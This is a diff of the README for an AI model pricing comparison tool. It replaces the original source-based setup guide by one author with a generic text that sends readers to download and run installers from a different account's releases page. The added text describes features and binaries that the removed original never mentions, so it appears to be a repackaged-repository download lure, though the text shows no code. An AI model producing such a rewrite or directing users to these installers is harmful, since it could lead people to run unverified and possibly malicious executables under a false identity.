@@ -1,224 +1,69 @@
-<div align="center">
+# 🌟 model-price - Effortlessly Compare AI Model Pricing
 
-# Model Price
+## 🚀 Getting Started
 
-**AI Model Pricing Aggregator** - Compare AI model pricing across major cloud providers in one place
+Welcome to **model-price**! This application helps you easily compare pricing for various AI models from platforms like AWS Bedrock, Azure OpenAI, OpenAI, Google Gemini, OpenRouter, xAI, and more. Follow the steps below to download and use the application.
 
-[![Python](https://img.shields.io/badge/Python-3.11+-3776ab?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688?style=flat-square&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![React](https://img.shields.io/badge/React-18+-61dafb?style=flat-square&logo=react&logoColor=white)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-3178c6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
+## 📥 Download the Application
 
-[English](README.md) | [简体中文](README_CN.md)
+[![Download model-price](https://img.shields.io/badge/Download-model--price-blue.svg)](https://github.com/austinmlang206/model-price/releases)
 
-</div>
+## 🖥️ System Requirements
 
----
+To ensure smooth functioning of the **model-price**, please make sure your system meets the following requirements:
 
-## Features
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or any Linux distribution
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 100 MB of free space
+- **Internet Connection**: Required for fetching pricing data
 
-- **Multi-provider Aggregation** - Compare pricing across 6 major AI service providers
-- **Real-time Updates** - Automatic scraping of official pricing data
-- **Smart Filtering** - Filter by provider, model family, and capabilities
-- **Dual View Modes** - Switch between card and table views
-- **Price Comparison** - Visual price bars for quick comparison
-- **574+ Models** - Coverage of GPT, Claude, Gemini, Llama and more
+## ⚙️ Installation Steps
 
-## Screenshots
+1. **Visit the Download Page**  
+   Go to the [model-price Releases Page](https://github.com/austinmlang206/model-price/releases).
 
-<div align="center">
+2. **Download the Latest Version**  
+   On the releases page, you will see a list of available versions. Click on the latest version to download the file suitable for your operating system.
 
-#### Card View
-![Card View](docs/images/main-view.png)
+3. **Locate the Downloaded File**  
+   Once the download is complete, go to your Downloads folder or the location where you saved the file.
 
-#### Table View
-![Table View](docs/images/table-view.png)
+4. **Run the Installer**  
+   - For Windows: Double-click the `.exe` file to start the installation process. Follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the **model-price** application into your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and run the executable in the terminal.
 
-#### Filter
-![Filter](docs/images/filter-provider.png)
+5. **Launch the Application**  
+   After installation, find the model-price app in your applications and double-click to start it. 
 
-</div>
+## 🧩 Using the Application
 
-## Supported Providers
+Once you have launched the application, you will see a simple and user-friendly interface. Here’s how to make the most of it:
 
-| Provider | Models | Data Source | Update Method |
-|:---------|:------:|:------------|:--------------|
-| **AWS Bedrock** | 96+ | Public Pricing API | Automatic |
-| **Azure OpenAI** | 50+ | Retail Pricing API | Automatic |
-| **OpenAI** | 53+ | Web Scraping | Automatic |
-| **Google Gemini** | 31+ | Web Scraping | Automatic |
-| **OpenRouter** | 339+ | Public API | Automatic |
-| **xAI (Grok)** | 12+ | Official Docs | Manual |
+- **Select AI Models**: Use the dropdown menu to choose the different AI models you want to compare.
+- **View Pricing**: Click the "Compare" button. The app will fetch the latest pricing data and display it in a clear table.
+- **Filter Results**: You can filter results based on your requirements, such as price range or features.
+- **Export Data**: Use the export function to save your comparison results in CSV or PDF format.
 
-## Tech Stack
+## 📊 Key Features
 
-<table>
-<tr>
-<td align="center" width="50%">
+- **Real-Time Pricing**: Get the latest pricing for AI models directly from the providers.
+- **User-Friendly Interface**: Simple navigation makes it easy for anyone to use.
+- **Cross-Platform**: Available for Windows, macOS, and Linux.
+- **Data Export**: Save your pricing comparisons for later reference.
 
-**Backend**
+## 📞 Need Help?
 
-</td>
-<td align="center" width="50%">
+If you encounter any issues or need assistance, please check the FAQ section on our GitHub page or open an issue. We are here to help you!
 
-**Frontend**
+## 💡 Tips for Best Performance
 
-</td>
-</tr>
-<tr>
-<td>
+- Ensure your internet connection is stable to get real-time data.
+- Close other applications while running model-price for optimal performance.
+- Keep your application updated by checking the releases page regularly.
 
-- Python 3.11+
-- FastAPI
-- Playwright (web scraping)
-- httpx (async HTTP)
-- uv (package manager)
+Thank you for choosing **model-price**! We hope this application makes your AI model pricing comparisons easier. For updates and feedback, feel free to connect with us on our [GitHub page](https://github.com/austinmlang206/model-price). 
 
-</td>
-<td>
+## 📥 Download Again
 
-- React 18
-- TypeScript 5
-- Vite
-- CSS Variables (theming)
-
-</td>
-</tr>
-</table>
-
-## Quick Start
-
-### Option 1: Local Development
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/xiaobox/model-price.git
-cd model-price
-
-# 2. Start backend
-cd backend
-uv run main.py
-# API runs at http://localhost:8000
-
-# 3. Start frontend (new terminal)
-cd frontend
-npm install
-npm run dev
-# Frontend runs at http://localhost:5173
-```
-
-### Option 2: Docker Deployment
-
-```bash
-# Coming soon
-docker-compose up -d
-```
-
-## API Documentation
-
-After starting the backend, visit http://localhost:8000/docs for full Swagger API documentation.
-
-### Core Endpoints
-
-| Method | Path | Description |
-|:-------|:-----|:------------|
-| `GET` | `/api/models` | Get all models (supports filtering and sorting) |
-| `GET` | `/api/models/{id}` | Get single model details |
-| `GET` | `/api/providers` | Get provider list |
-| `GET` | `/api/families` | Get model family list |
-| `GET` | `/api/stats` | Get statistics |
-| `POST` | `/api/refresh` | Refresh pricing data |
-
-## Project Structure
-
-```
-model-price/
-├── backend/
-│   ├── main.py              # FastAPI entry point
-│   ├── config.py            # Configuration
-│   ├── models/              # Data models
-│   ├── providers/           # Provider data fetchers
-│   │   ├── aws_bedrock.py
-│   │   ├── azure_openai.py
-│   │   ├── openai.py
-│   │   ├── google_gemini.py
-│   │   ├── openrouter.py
-│   │   └── xai.py
-│   ├── services/            # Business logic
-│   └── data/                # Cached data
-├── frontend/
-│   ├── src/
-│   │   ├── components/      # React components
-│   │   ├── hooks/           # Custom Hooks
-│   │   ├── config/          # Frontend config
-│   │   └── types/           # TypeScript types
-│   └── package.json
-└── docs/
-    └── images/              # Documentation images
-```
-
-## Data Update Strategy
-
-| Provider | Technology | Authentication | Reliability |
-|:---------|:-----------|:---------------|:-----------:|
-| AWS Bedrock | httpx async | Not required | High |
-| Azure OpenAI | httpx + pagination | Not required | High |
-| OpenAI | Playwright scraper | Not required | Medium |
-| Google Gemini | Playwright scraper | Not required | Medium |
-| OpenRouter | httpx API | Not required | High |
-| xAI | Static data | N/A | Manual update |
-
-## Development Guide
-
-### Backend Development
-
-```bash
-cd backend
-
-# Add dependencies
-uv add <package-name>
-
-# Run dev server (hot reload)
-uv run main.py
-
-# Manually refresh data
-curl -X POST http://localhost:8000/api/refresh
-```
-
-### Frontend Development
-
-```bash
-cd frontend
-
-# Install dependencies
-npm install
-
-# Development mode
-npm run dev
-
-# Production build
-npm run build
-```
-
-## Contributing
-
-Contributions are welcome! Feel free to submit Issues and Pull Requests.
-
-1. Fork this repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
----
-
-If you find this project helpful, please give it a Star ⭐️! Issues and PRs are always welcome.
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=xiaobox/model-price&type=Date)](https://www.star-history.com/#xiaobox/model-price&Date)
+[![Download model-price](https://img.shields.io/badge/Download-model--price-blue.svg)](https://github.com/austinmlang206/model-price/releases)
